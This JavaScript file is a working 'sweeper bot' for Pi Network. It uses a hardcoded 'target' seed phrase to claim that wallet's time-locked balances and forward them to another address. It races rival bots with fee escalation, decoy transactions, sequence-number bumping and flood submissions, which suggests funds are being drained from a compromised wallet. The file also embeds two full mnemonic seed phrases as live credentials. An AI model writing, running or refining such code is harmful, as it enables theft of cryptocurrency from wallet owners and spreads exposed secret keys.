// Enhanced Pi Network Sweeper Bot with Competition Management
// Implements multiple strategies to outcompete other bots

import * as ed25519 from 'ed25519-hd-key';
import StellarSdk, { TimeoutInfinite } from 'stellar-sdk';
import * as bip39 from 'bip39';
import crypto from 'crypto';

// Enhanced Configuration
const config = {
    horizonUrl: 'https://api.mainnet.minepi.com',
    networkPassphrase: 'Pi Network',
    baseFee: 5000000,              // 0.5 PI
    maxFee: 50000000,              // 5 PI (increased for competition)
    feePriorityMultiplier: 2.5,    // More aggressive fee bumping
    maxSubmissionAttempts: 10,     // More attempts
    floodCount: 5,                 // More duplicate submissions
    floodInterval: 100,            // Faster flooding
    debug: true,
    timeboundGrace: 60,
    retryDelay: 1000,              // Faster retries
    rateLimitDelay: 5000,
    
    // Competition strategies
    preSubmitWindow: 5000,         // Submit 5 seconds before unlock
    batchSize: 5,                  // Submit multiple claims at once
    monitorInterval: 500,          // Check for competitors every 500ms
    aggressiveMode: true,          // Enable aggressive competition tactics
    decoyTransactions: true,       // Submit decoy transactions
    sequenceBumping: true,         // Use sequence number manipulation
};

class EnhancedPiSweeperBot {
    constructor(targetMnemonic, destination, sponsorMnemonic) {
        this.dest = destination;
        this.targetKP = this.mnemonicToKeypair(targetMnemonic);
        this.sponsorKP = this.mnemonicToKeypair(sponsorMnemonic);
        this.server = new StellarSdk.Server(config.horizonUrl, { allowHttp: false });
        this.network = config.networkPassphrase;
        this.currentFee = config.baseFee;
        this.competitorFees = new Map(); // Track competitor fees
        this.pendingClaims = new Set(); // Track claims in progress
        this.successfulClaims = new Set(); // Track successful claims
        
        // Initialize websocket for real-time monitoring if available
        this.streamConnection = null;
        
        this.claimableUrl = `${config.horizonUrl}/claimable_balances?claimant=${this.targetKP.publicKey()}`;
        this.log(`Enhanced Bot Initialized. Target: ${this.targetKP.publicKey()}`);
    }

    log(msg) {
        if (config.debug) console.log(`[${new Date().toISOString()}] ${msg}`);
    }

    mnemonicToKeypair(mnemonic) {
        const seed = bip39.mnemonicToSeedSync(mnemonic);
        const path = "m/44'/314159'/0'";
        const { key } = ed25519.derivePath(path, seed.toString('hex'));
        return StellarSdk.Keypair.fromRawEd25519Seed(Buffer.from(key));
    }

    // Monitor competitor transactions in real-time
    async startCompetitorMonitoring() {
        if (!config.aggressiveMode) return;
        
        try {
            // Monitor transactions stream for competing claims
            this.streamConnection = this.server.transactions()
                .cursor('now')
                .stream({
                    onmessage: (transaction) => {
                        this.analyzeCompetitorTransaction(transaction);
                    },
                    onerror: (error) => {
                        this.log(`Stream error: ${error}`);
                        setTimeout(() => this.startCompetitorMonitoring(), 5000);
                    }
                });
        } catch (err) {
            this.log(`Failed to start monitoring: ${err.message}`);
        }
    }

    // Analyze competitor transactions to adjust strategy
    analyzeCompetitorTransaction(tx) {
        try {
            // Check if transaction contains claimable balance operations
            const ops = tx.operations || [];
            for (const op of ops) {
                if (op.type === 'claim_claimable_balance') {
                    const fee = parseInt(tx.fee_charged || tx.max_fee);
                    this.competitorFees.set(tx.source_account, fee);
                    
                    // Adjust our fee if competitor is paying more
                    if (fee > this.currentFee) {
                        this.currentFee = Math.min(fee * 1.5, config.maxFee);
                        this.log(`Competitor detected with fee ${fee}, adjusting to ${this.currentFee}`);
                    }
                }
            }
        } catch (err) {
            // Ignore parsing errors
        }
    }

    // Batch multiple claims together for atomic execution
    async buildBatchTransaction(balances) {
        const sponsorAcc = await this.server.loadAccount(this.sponsorKP.publicKey());
        const builder = new StellarSdk.TransactionBuilder(sponsorAcc, {
            fee: String(this.currentFee * balances.length), // Fee per operation
            networkPassphrase: this.network,
        });

        let totalAmount = 0;
        const validBalances = [];

        // Add all claim operations
        for (const balance of balances) {
            try {
                builder.addOperation(StellarSdk.Operation.claimClaimableBalance({
                    balanceId: balance.id,
                    source: this.targetKP.publicKey(),
                }));
                totalAmount += parseFloat(balance.amount);
                validBalances.push(balance);
            } catch (err) {
                this.log(`Skipping invalid balance ${balance.id}: ${err.message}`);
            }
        }

        // Add single payment operation for total amount
        if (totalAmount > 0) {
            builder.addOperation(StellarSdk.Operation.payment({
                destination: this.dest,
                asset: StellarSdk.Asset.native(),
                amount: totalAmount.toFixed(7),
                source: this.targetKP.publicKey(),
            }));
        }

        // Calculate optimal time bounds
        const now = Math.floor(Date.now() / 1000);
        const maxUnlockTime = Math.max(...validBalances.map(b => this.extractMinTime(b) || 0));
        
        builder.setTimebounds(
            now - 5,
            maxUnlockTime + config.timeboundGrace
        );

        return { transaction: builder.build(), validBalances };
    }

    // Submit decoy transactions to confuse competitors
    async submitDecoyTransactions() {
        if (!config.decoyTransactions) return;

        try {
            const account = await this.server.loadAccount(this.sponsorKP.publicKey());
            
            // Create a simple payment to self
            const decoy = new StellarSdk.TransactionBuilder(account, {
                fee: String(this.currentFee / 2),
                networkPassphrase: this.network,
            })
            .addOperation(StellarSdk.Operation.payment({
                destination: this.sponsorKP.publicKey(),
                asset: StellarSdk.Asset.native(),
                amount: "0.0000001",
            }))
            .setTimeout(30)
            .build();

            decoy.sign(this.sponsorKP);
            
            // Submit without waiting for result
            this.server.submitTransaction(decoy).catch(() => {});
            
        } catch (err) {
            // Ignore decoy errors
        }
    }

    // Advanced sequence number manipulation
    async manipulateSequence() {
        if (!config.sequenceBumping) return;

        try {
            const account = await this.server.loadAccount(this.sponsorKP.publicKey());
            const currentSeq = account.sequenceNumber();
            
            // Bump sequence to reserve future slots
            const bumpTx = new StellarSdk.TransactionBuilder(account, {
                fee: String(config.baseFee),
                networkPassphrase: this.network,
            })
            .addOperation(StellarSdk.Operation.bumpSequence({
                bumpTo: (BigInt(currentSeq) + BigInt(100)).toString()
            }))
            .setTimeout(30)
            .build();

            bumpTx.sign(this.sponsorKP);
            await this.server.submitTransaction(bumpTx);
            
            this.log(`Sequence bumped to reserve transaction slots`);
        } catch (err) {
            this.log(`Sequence manipulation failed: ${err.message}`);
        }
    }

    // Pre-submit transactions before unlock time
    async preSubmitTransaction(tx, unlockTime) {
        const now = Date.now();
        const unlockMs = unlockTime * 1000;
        const submitTime = unlockMs - config.preSubmitWindow;
        
        if (submitTime > now) {
            const waitTime = submitTime - now;
            this.log(`Waiting ${waitTime}ms to pre-submit transaction`);
            await new Promise(resolve => setTimeout(resolve, waitTime));
        }

        // Start submitting before actual unlock
        return this.aggressiveSubmit(tx);
    }

    // Aggressive submission with multiple strategies
    async aggressiveSubmit(tx) {
        const promises = [];
        
        // Strategy 1: Direct submission
        promises.push(this.server.submitTransaction(tx).catch(err => ({ error: err })));
        
        // Strategy 2: Delayed submissions
        for (let i = 1; i <= 3; i++) {
            promises.push(
                new Promise(resolve => setTimeout(() => {
                    this.server.submitTransaction(tx)
                        .then(res => resolve(res))
                        .catch(err => resolve({ error: err }));
                }, i * 100))
            );
        }
        
        // Race all submissions
        const results = await Promise.race([
            Promise.any(promises),
            new Promise((_, reject) => setTimeout(() => reject(new Error('All submissions timeout')), 10000))
        ]);
        
        return results;
    }

    // Enhanced fee calculation based on competition
    calculateCompetitiveFee() {
        let baseFee = this.currentFee;
        
        // Check recent competitor fees
        const recentFees = Array.from(this.competitorFees.values())
            .filter(fee => fee > 0)
            .sort((a, b) => b - a);
        
        if (recentFees.length > 0) {
            // Pay more than the highest competitor
            baseFee = Math.min(recentFees[0] * 1.2, config.maxFee);
        }
        
        // Time-based fee adjustment (higher fees during peak times)
        const hour = new Date().getHours();
        if (hour >= 9 && hour <= 17) { // Business hours
            baseFee *= 1.5;
        }
        
        return Math.min(Math.floor(baseFee), config.maxFee);
    }

    // Get all claimable balances with retry
    async getAllBalances() {
        let attempts = 0;
        const maxAttempts = 3;
        
        while (attempts < maxAttempts) {
            try {
                const resp = await this.server
                    .claimableBalances()
                    .claimant(this.targetKP.publicKey())
                    .limit(200) // Increased limit
                    .order('desc') // Get newest first
                    .call();
                
                // Filter out already processed claims
                return resp.records.filter(balance => 
                    !this.successfulClaims.has(balance.id) &&
                    !this.pendingClaims.has(balance.id)
                );
            } catch (err) {
                attempts++;
                if (err.response && err.response.status === 503) {
                    await new Promise(res => setTimeout(res, config.rateLimitDelay));
                } else {
                    await new Promise(res => setTimeout(res, config.retryDelay));
                }
                
                if (attempts >= maxAttempts) throw err;
            }
        }
    }

    extractMinTime(balance) {
        const claimant = balance.claimants.find(c => c.destination === this.targetKP.publicKey());
        if (claimant && claimant.predicate) {
            if (claimant.predicate.abs_after) {
                return parseInt(claimant.predicate.abs_after, 10);
            }
            if (claimant.predicate.not && claimant.predicate.not.abs_before_epoch) {
                return parseInt(claimant.predicate.not.abs_before_epoch, 10);
            }
        }
        return 0;
    }

    // Main enhanced loop
    async start() {
        // Start competitor monitoring
        await this.startCompetitorMonitoring();
        
        // Periodic sequence manipulation
        if (config.sequenceBumping) {
            setInterval(() => this.manipulateSequence(), 60000);
        }
        
        while (true) {
            try {
                // Update fees based on competition
                this.currentFee = this.calculateCompetitiveFee();
                
                const balances = await this.getAllBalances();
                
                if (!balances.length) {
                    this.log('No claimable balances found. Waiting...');
                    await new Promise(res => setTimeout(res, 5000));
                    continue;
                }
                
                this.log(`Found ${balances.length} claimable balances`);
                
                // Sort by value and unlock time
                balances.sort((a, b) => {
                    const timeA = this.extractMinTime(a);
                    const timeB = this.extractMinTime(b);
                    if (timeA !== timeB) return timeA - timeB;
                    return parseFloat(b.amount) - parseFloat(a.amount);
                });
                
                // Process in batches
                for (let i = 0; i < balances.length; i += config.batchSize) {
                    const batch = balances.slice(i, i + config.batchSize);
                    
                    // Mark as pending
                    batch.forEach(b => this.pendingClaims.add(b.id));
                    
                    try {
                        // Submit decoys to confuse competitors
                        if (config.decoyTransactions && Math.random() > 0.5) {
                            await this.submitDecoyTransactions();
                        }
                        
                        if (batch.length === 1) {
                            // Single claim - use original aggressive approach
                            await this.processSingleBalance(batch[0]);
                        } else {
                            // Batch claims
                            await this.processBatchBalances(batch);
                        }
                        
                    } catch (err) {
                        this.log(`Batch processing error: ${err.message}`);
                    } finally {
                        // Remove from pending
                        batch.forEach(b => this.pendingClaims.delete(b.id));
                    }
                    
                    // Small delay between batches
                    await new Promise(res => setTimeout(res, 500));
                }
                
            } catch (e) {
                this.log(`Main loop error: ${e.message}`);
                await new Promise(res => setTimeout(res, config.rateLimitDelay));
            }
        }
    }

    // Process single balance with all strategies
    async processSingleBalance(balance) {
        const id = balance.id;
        const amt = balance.amount;
        this.log(`Processing single balance ${id} (${amt} PI)`);
        
        let attempt = 0;
        let currentMultiplier = 1;
        
        while (attempt < config.maxSubmissionAttempts) {
            try {
                const unlockTime = this.extractMinTime(balance);
                const now = Math.floor(Date.now() / 1000);
                const lowerBound = Math.max(now - 5, unlockTime - config.preSubmitWindow / 1000);
                const upperBound = unlockTime + config.timeboundGrace;
                
                if (lowerBound >= upperBound) {
                    throw new Error('Invalid time bounds');
                }
                
                const sponsorAcc = await this.server.loadAccount(this.sponsorKP.publicKey());
                
                const tx = new StellarSdk.TransactionBuilder(sponsorAcc, {
                    fee: String(Math.floor(this.currentFee * currentMultiplier)),
                    networkPassphrase: this.network,
                })
                .addOperation(StellarSdk.Operation.claimClaimableBalance({
                    balanceId: id,
                    source: this.targetKP.publicKey(),
                }))
                .addOperation(StellarSdk.Operation.payment({
                    destination: this.dest,
                    asset: StellarSdk.Asset.native(),
                    amount: amt,
                    source: this.targetKP.publicKey(),
                }))
                .setTimebounds(lowerBound, upperBound)
                .setTimeout(300)
                .build();
                
                tx.sign(this.targetKP);
                tx.sign(this.sponsorKP);
                
                // Use pre-submit for time-locked balances
                let result;
                if (unlockTime > now) {
                    result = await this.preSubmitTransaction(tx, unlockTime);
                } else {
                    result = await this.aggressiveSubmit(tx);
                }
                
                if (!result.error) {
                    this.log(`Success! Hash: ${result.hash}`);
                    this.successfulClaims.add(id);
                    
                    // Flood duplicates
                    for (let i = 0; i < config.floodCount; i++) {
                        setTimeout(() => {
                            this.server.submitTransaction(tx).catch(() => {});
                        }, i * config.floodInterval);
                    }
                    
                    return true;
                }
                
                throw result.error;
                
            } catch (err) {
                attempt++;
                currentMultiplier *= config.feePriorityMultiplier;
                
                if (err.response && err.response.data && err.response.data.extras) {
                    const resultCodes = err.response.data.extras.result_codes;
                    if (resultCodes && resultCodes.operations && 
                        resultCodes.operations.includes('op_no_claimable_balance')) {
                        this.log('Balance already claimed');
                        this.successfulClaims.add(id);
                        return false;
                    }
                }
                
                this.log(`Attempt ${attempt} failed: ${err.message}`);
                this.log(`Increasing fee multiplier to ${currentMultiplier}`);
                
                if (attempt < config.maxSubmissionAttempts) {
                    await new Promise(res => setTimeout(res, config.retryDelay));
                }
            }
        }
        
        return false;
    }

    // Process batch of balances
    async processBatchBalances(batch) {
        this.log(`Processing batch of ${batch.length} balances`);
        
        try {
            const { transaction, validBalances } = await this.buildBatchTransaction(batch);
            
            if (validBalances.length === 0) {
                this.log('No valid balances in batch');
                return;
            }
            
            transaction.sign(this.targetKP);
            transaction.sign(this.sponsorKP);
            
            const result = await this.aggressiveSubmit(transaction);
            
            if (!result.error) {
                this.log(`Batch success! Hash: ${result.hash}`);
                validBalances.forEach(b => this.successfulClaims.add(b.id));
                return true;
            }
            
            throw result.error;
            
        } catch (err) {
            this.log(`Batch failed: ${err.message}`);
            
            // Fall back to individual processing
            for (const balance of batch) {
                await this.processSingleBalance(balance);
            }
        }
    }
}

// Utility function to monitor network congestion
async function getNetworkCongestion(server) {
    try {
        const ledger = await server.ledgers().order('desc').limit(1).call();
        const currentLedger = ledger.records[0];
        const successRate = currentLedger.successful_transaction_count / 
                          (currentLedger.failed_transaction_count + currentLedger.successful_transaction_count);
        
        return {
            congested: successRate < 0.8,
            baseFee: parseInt(currentLedger.base_fee_in_stroops),
            maxFee: parseInt(currentLedger.max_fee_in_stroops || currentLedger.base_fee_in_stroops * 100)
        };
    } catch (err) {
        return { congested: false, baseFee: config.baseFee, maxFee: config.maxFee };
    }
}

// Main execution
(async () => {
    const target = 'embrace gloom critic jaguar echo concert execute dawn shed myth bread random orient hedgehog pond corn eye raccoon energy situate indicate resist pool sad';
    const sponsor = 'cute increase lab raw blade lawsuit soon congress title flat brown smoke hair hard property copper limit regular process remember use safe yellow quantum';
    const dest = 'GAHQMFHVA7EKDD54L4HBX4QNCTGCLVTCP5DXKKFSTEBTQBNG6WDVGLCR';
    
    const bot = new EnhancedPiSweeperBot(target, dest, sponsor);
    
    // Check network congestion before starting
    const congestion = await getNetworkCongestion(bot.server);
    if (congestion.congested) {
        console.log('⚠️  Network is congested. Adjusting base fee...');
        config.baseFee = congestion.baseFee * 2;
    }
    
    await bot.start();
})();